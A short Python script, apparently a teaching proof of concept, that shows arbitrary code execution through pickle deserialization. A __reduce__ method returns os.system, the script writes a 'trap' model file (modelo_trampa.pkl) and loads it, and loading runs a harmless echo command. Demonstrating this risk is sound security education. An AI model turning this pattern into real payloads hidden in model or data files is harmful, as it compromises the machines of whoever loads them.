import os
import pickle

class PayloadDemostracion:
    def __reduce__(self):
        return (os.system, ("echo '[ALERTA SEGURIDAD] Se ejecuto codigo arbitrario durante la deserializacion.'",))

def crear_archivo_trampa():
    payload = PayloadDemostracion()
    with open("prototipos/modelo_trampa.pkl", "wb") as f:
        pickle.dump(payload, f)
    print("Archivo 'prototipos/modelo_trampa.pkl' generado.")

def cargar_archivo_trampa():
    print("Cargando archivo trampa...")
    with open("prototipos/modelo_trampa.pkl", "rb") as f:
        pickle.load(f)

if __name__ == "__main__":
    crear_archivo_trampa()
    cargar_archivo_trampa()